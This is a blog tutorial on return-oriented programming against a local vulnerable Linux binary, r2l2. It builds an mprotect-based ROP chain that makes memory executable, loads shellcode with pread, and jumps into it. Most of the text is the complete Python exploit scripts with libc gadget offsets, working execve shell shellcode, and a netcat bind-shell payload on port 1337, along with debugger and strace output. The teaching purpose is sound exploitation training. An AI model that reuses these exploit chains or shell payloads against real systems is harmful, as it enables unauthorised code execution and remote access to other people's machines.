---
layout: post
title: "Buffer overflow - advanced ROP: rwx memory for shellcode"
date: 2020-01-11
tags: [security, linux, programming, vulnerabilities]
---


Return-oriented programming can be used to change the access protections of a vulnerable process's memory regions to give us an area from which we can execute shellcode. Continuing to exploit r2l2, we will use the `mprotect()` syscall to turn a region of memory RWX, then inject and execute shellcode.

From `man mprotect`, we know that `mprotect()` requires three arguments:

```c
int mprotect(void *addr, size_t len, int prot);
```

The first two arguments will decide which region of memory we will change permissions on. The length can be 1 since the access protections will be changed for the entire memory page containing the range specified by the address and the length. The last argument will be 0x7 (which is RWX). These arguments are passed in `%rdi`, `%rsi` and `%rdx`. We will put the arguments on the stack, then use gadgets to pop them into the registers.

> The victim program uses `scanf()`, so we don't need to worry about null bytes.

`mprotect` is a syscall, meaning we need to put its syscall number in `%rax`, then execute a `syscall` instruction.

The syscall number is for `mprotect` is 10:

```bash
$ grep mprotect /usr/include/asm/unistd*
...
/usr/include/asm/unistd_64.h:#define __NR_mprotect 10
...
```

Since 10 (0xa) is the newline character, we can't get it through stdin, as `scanf()` will stop reading after a newline. We will look for a gadget that e.g. moves the value 10 into `%rax`, or run an `inc %rax` gadget multiple times.

We find the needed gadgets:

```bash
> search /1/ pop%; ret
0x0000000000023dd3: pop rdi; ret;
...
0x00000000000821d6: pop rdx; ret;
...
0x000000000002477e: pop rsi; ret;
...

> search syscall; ret
...
0x0000000000082869: syscall; ret;

> search /1/ mov rax, 7
...
0x00000000000b8a00: mov rax, 7; ret;

> search /1/ add rax
...
0x00000000000b8980: add rax, 3; ret;

```

> Tip: start `ropper` and use `file <file>` to search like above. I searched `libc`.


Notice that to get 0xa into `rax`, we first use a gadget to move the value 7 into it (this gadget was found with searches starting at 10), then a gadget that adds 3.

> `/1/` tells ropper to show only gadgets of the best quality.

> Try to find alternative, usable gadgets as a challenge. Maybe there's a gadget that can do the work of many of the above gadgets?

The next challenge is to put shellcode in our RWX memory.

We are going to use the `read()` system call to get the shellcode from stdin.

> We could also use `open()` and `read()` to get the shellcode from e.g. a file, or `strcpy` to copy the shellcode from an environment variable. There are several other possibilities as well.

From `man 2 read`, we know that `read()` expects a file descriptor, a (destination) buffer address and the number of bytes to read. We will put these values on the stack, and we have already have gadgets to pop into `%rdi`, `%rsi` and `%rdx`


`read()` has system call number 0:

```bash
$ grep read /usr/include/asm/unistd_64.h
#define __NR_read 0
...
```

We will use a gadget zero out `%rax` for the syscall (we have already found a syscall gadget above):

```bash
> search /1/ xor rax, rax
0x000000000009bb89: xor rax, rax; ret;
```

Now that we got all the gadgets, we need to find a memory area to turn rwx. I've chosen to go with this region:

```
$ ./r2l2
Input something: ^Z
[1]+  Stopped                 ./r2l2
$ jobs -l
[1]+ 27550 Stopped                 ./r2l2
$ cat /proc/27550/maps
..
00404000-00405000 rw-p 00003000 fd:04 3942728                     /path/to/r2l2
...
```

> `pmap <pid>` is an alternative to `cat /proc/<pid>/maps`.

In gdb, we can see that this region contains following:

```
(gdb) start
(gdb) info file
...
0x0000000000404000 - 0x0000000000404028 is .got.plt
0x0000000000404028 - 0x000000000040402c is .data
0x000000000040402c - 0x0000000000404030 is .bss
...
(gdb) x/10gx 0x404000
0x404000:       0x0000000000403e20      0x00007ffff7ffe150
0x404010:       0x00007ffff7fe9120      0x0000000000401036
0x404020 <__isoc99_scanf@got.plt>:      0x0000000000401046      0x0000000000000000
0x404030:       0x0000000000000000      0x0000000000000000
0x404040:       0x0000000000000000      0x0000000000000000
...
```

With all the information gathered, below is our unfinished exploit:

```python
# r2l2_exploit2.py
import struct

# value found with ldd
libc_base = 0x00007ffff7de4000

# fill buffer and overwrite saved frame pointer
pad = 40 * "a"

# mprotect() arguments
addr   = struct.pack("<Q", 0x404000)
length = struct.pack("<Q", 1)
prot   = struct.pack("<Q", 7)

# read() arguments
fd    = 8 * "\x00"
dest  = addr
count = struct.pack("<Q", 50)

# gadgets
poprdi  = struct.pack("<Q", libc_base + 0x23dd3)
poprsi  = struct.pack("<Q", libc_base + 0x2477e)
poprdx  = struct.pack("<Q", libc_base + 0x821d6)
syscall = struct.pack("<Q", libc_base + 0x82869)
raxto7  = struct.pack("<Q", libc_base + 0xb8a00)
raxpl3  = struct.pack("<Q", libc_base + 0xb8980)
raxto0  = struct.pack("<Q", libc_base + 0x9bb89)

# mprotect()
smpro = raxto7 + raxpl3 + poprdi + addr + poprsi + length + poprdx + prot + syscall
# read()
sread = raxto0 + poprdi + fd + poprsi + dest + poprdx + count + syscall

shellcode = "AAAA"

print pad + smpro + sread
print shellcode
```

Now do `python r2l2_exploit2.py > exploit`, so you can easily use `run < exploit` in gdb.

If you step through this in `gdb`, by for example breaking at the end of `cp`, then using `si` to watch values being popped into registers (set `display/i $rip` first), inspecting all registers before the syscall by using `i r rax rdi rsi rdx`, and then confirming if the syscalls have the desired outcome, you will notice:

- the memory area is correctly set as RWX
    - `i proc` in gdb to get the PID, then do `cat /proc/<PID>/maps`  or `pmap <PID>` in the shell
- no A's are written to the buffer (use `x/10xb 0x404000` to peek at the buffer)

If you in gdb do `call (char)getchar()` a few times, you will get:

```bash
(gdb) call (char)getchar()
$3 = 10 '\n'
(gdb)
$4 = 65 'A'
(gdb)
$5 = 65 'A'
(gdb)
$6 = 65 'A'
(gdb)
$7 = 65 'A'
(gdb)
$8 = 10 '\n'
```

Some might now instantly remember that `scanf()` leaves a newline in the STDIN buffer, and think that the solution might then be to simply call `getchar()` from our shellcode before calling `read()` to get rid of the newline. But this is not a solution, because the problem is a bit more complicated.

Let's do some experiments. In the debugger, right after the `mprotect()` syscall has finished, we take note of the following:

`scanf()` sucessfully writes our shellcode to the buffer:

```bash
(gdb) call (int)scanf("%s", 0x404000)
$10 = 1
(gdb) x/4xb 0x404000
0x404000:       0x41    0x41    0x41    0x41
```

The incredibly dangerous `gets()` also gets it right:

```bash
(gdb) call (char *)gets(0x404000)
$11 = 0x404000 ""
(gdb)
$12 = 0x404000 "AAAA"
(gdb) x/4xb 0x404000
0x404000:       0x41    0x41    0x41    0x41
```

So we could use these, as well as a bunch of other alternatives, to get our shellcode into our executable buffer, but let's stick with `read()` a while longer.

The reason these get it right, while `read()` does not, is that they use a buffering wrapper around UNIX file descriptors (namely `FILE *stdin`), while `read()` uses the raw UNIX file interface (with a file descriptor set in the `int fd` argument).

If we study the file descriptor before `read()` is called, we can see that the offset position is at the end of the input data:


```bash
$ cat /proc/<PID>/fd/0
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}@@~aih}~@@a2ih
AAAA
$ cat /proc/<PID>/fd/0 | wc -c
182
$ cat /proc/<PID>/fdinfo/0
pos:    182
flags:  0100000
mnt_id: 127
```

When we execute `read()`, it returns 0:

```bash
(gdb) call (int)read(0, 0x404000, 100)
$13 = 0
```

The man-page states *if the file offset is at or past the end of file, no bytes are read, and read() returns zero*.

Knowing this, we can use `lseek()` with `SEEK_SET` to reposition the file offset to where we need it.

First we need to figure out the proper offset, which is the location of our shellcode:

```bash
$ cat /proc/<PID>/fd/0 | grep -aob A
177:A
178:A
179:A
180:A
```

> Note: the offset can also be found be using `len() + 1` in Python on the string we print before the shellcode.

Then we use `lseek()` to reposition:

```bash
(gdb) call (int)lseek(0, 177, 0)
$14 = 177
```
> Note: `grep SEEK_SET /usr/include/unistd.h` to get 0.

We observe that this is working:

```bash
$ cat /proc/<PID>/fdinfo/0
pos:    177
flags:  0100000
mnt_id: 127
```

And finally we get a successful read into the buffer with `read()`:

```
(gdb) call (int)read(0, 0x404000, 50)
$15 = 5
(gdb) x/5xb 0x404000
0x404000:       0x41    0x41    0x41    0x41    0x0a
```

This all boils down this (from `stdin` man-page):

*Note that mixing use of `FILE`s and raw file descriptors can produce unexpected results and should generally be avoided.*

In our finished exploit, there's another system call we can use instead of `lseek()` + `read()`:

```
ssize_t pread(int fd, void *buf, size_t count, off_t offset);
```

`pread()`  reads from file descriptor at an offset (from the start of the file) into the buffer, so for the extra argument, all we need is to push the *proper* offset to the stack, and use a gadget to pop into `r10`:

```
0x00000000000821d5: pop r10; ret;

```

> Remember that syscalls use R10 instead of RCX for argument 4.

The system call number must also be updated:

```
$ grep pread /usr/include/asm/unistd_64.h
#define __NR_pread64 17
```

To complete our exploit we also need to change the shellcode to real shellcode, and finish with a jump to the shellcode. The last gadgets we need are:

```
0x000000000003b5f0: pop rax; ret;
0x0000000000024699: jmp rax;
```

The exploit now looks like this:

```
# r2l2_exploit3.py
import struct

# value found with ldd
libc_base = 0x00007ffff7de4000

# fill buffer and overwrite saved frame pointer
pad = 40 * "a"

# mprotect() arguments
addr   = struct.pack("<Q", 0x404000)
length = struct.pack("<Q", 1)
prot   = struct.pack("<Q", 7)

# pread() arguments
psnr   = struct.pack("<Q", 17) # system call number
fd     = 8 * "\x00"
dest   = addr
count  = struct.pack("<Q", 50)
offset = struct.pack("<Q", 225)

# gadgets
poprdi  = struct.pack("<Q", libc_base + 0x23dd3)
poprsi  = struct.pack("<Q", libc_base + 0x2477e)
poprdx  = struct.pack("<Q", libc_base + 0x821d6)
syscall = struct.pack("<Q", libc_base + 0x82869)
raxto7  = struct.pack("<Q", libc_base + 0xb8a00)
raxpl3  = struct.pack("<Q", libc_base + 0xb8980)
jmprax  = struct.pack("<Q", libc_base + 0x24699)
poprax  = struct.pack("<Q", libc_base + 0x3b5f0)
popr10  = struct.pack("<Q", libc_base + 0x821d5)

# mprotect()
smpro = raxto7 + raxpl3 + poprdi + addr + poprsi + length + poprdx + prot + syscall
# pread()
spread = poprax + psnr + poprdi + fd + poprsi + dest + poprdx + count + popr10 + offset + syscall
# jump to shellcode
jmptosh = poprax + addr + jmprax

shellcode = "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

print pad + smpro + spread + jmptosh
print shellcode
```

Running the exploit, we get the following:


```bash
$ python r2l2_exploit3.py > exploit3
$ (cat exploit3; cat) | ./r2l2
Input something: The first character was: a
ls
Segmentation fault (core dumped)
```

Debugging the core dump with gdb, it's easy to understand what has happened:

```bash
(gdb) bt
#0  0x0000000000404007 in ?? ()
#1  0x00007ffff7e1f5f0 in ?? ()
#2  0x000000000000003c in ?? ()
#3  0x00007ffff7e07dd3 in ?? ()
#4  0x0000000000000000 in ?? ()
#5  0x00007ffff7e66869 in ?? ()
```

The program has crashed while executing our shellcode.

Looking at the memory area supposed to contain our shellcode, we see it clearly doesn't:

```bash
(gdb) x/10x 0x404000
0x404000:       0x00    0x3e    0x40    0x00    0x00    0x00    0x00    0x00
0x404008:       0x50    0xe1
(gdb) x/5i 0x404000
   0x404000:    add    %bh,(%rsi)
   0x404002:    add    %al,(%rax)
   0x404005:    add    %al,(%rax)
=> 0x404007:    add    %dl,-0x1f(%rax)
   0x40400a:    push   %rdi
```

By using `strace`, we see that `mprotect()` succeeds, but `pread()` fails:

```
$ (cat exploit3; cat) | strace ./r2l2
...
mprotect(0x404000, 1, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
pread64(0, 0x404000, 50, 300)           = -1 ESPIPE (Illegal seek)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_ACCERR, si_addr=0x403fe1} ---
+++ killed by SIGSEGV (core dumped) +++
```

The return value `ESPIPE` means that the file descriptor is associated with a pipe, socket, or FIFO. And so we understand that we can't feed input to our program with a pipe.

If we redirect the contents of the exploit file to stdin of the program, it runs and closes without a segmentation fault:

```bash
$ ./r2l2 < exploit3
$
```

Does this mean that everything is working, but the program closes since stdin closes? Yes it does:

```
$ strace -e trace=mprotect,pread64,execve ./r2l2 < exploit3
...
mprotect(0x404000, 1, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
pread64(0, "H1\322H\273\377/bin/shH\301\353\10SH\211\347H1\300PWH\211\346\260;\17"..., 50, 300) = 34
execve("/bin/sh", ["/bin/sh"], NULL)    = 0
...
```

It's even more clear if you change out "sh" for "ps" in the shellcode

```
$ sed 's/sh/ps/' exploit3 > exploit3_ps
$ ./r2l2 < exploit3_ps
Input something: The first character was: a
  PID TTY          TIME CMD
27912 pts/9    00:00:00 ps
32670 pts/9    00:00:09 bash
$
```

So we can execute any type of shellcode we want, for example a reverse or bind shell.

Here's an example of running the exploit with a random bind shell I found on shell-storm:

```
shellcode = ("\x48\x31\xc0"
"\x48\x31\xd2\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63"
"\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62"
"\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x48\x89\xe1"
"\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\x48\xc1\xeb"
"\x30\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33"
"\x33\x37\x49\xc1\xea\x20\x41\x52\x49\x89\xe2\x49\xb9"
"\xff\xff\xff\xff\xff\xff\x2d\x70\x49\xc1\xe9\x30\x41"
"\x51\x49\x89\xe1\x49\xb8\xff\xff\xff\xff\xff\xff\x2d"
"\x6c\x49\xc1\xe8\x30\x41\x50\x49\x89\xe0\x52\x51\x53"
"\x41\x52\x41\x51\x41\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")
```

> The shellcode is from http://shell-storm.org/shellcode/files/shellcode-822.php, written by Gaussillusion. The author did not zero out `rax` before moving the `execve` system call number into `al`, so I've prefixed three bytes to do this. A lot of shellcode shared online make assumptions about register state, so keep that in mind.

Make sure to update the `count` parameter of `pread()`, so that all the shellcode is copied to our executable buffer.

Terminal one:

```bash
$ pwd
/home/user
$ ./r2l2 <  exploit3_bind
Input something: The first character was: a
█
```

Terminal two:

```
$ pwd
/
$ nc localhost 1337
pwd
/home/user
```
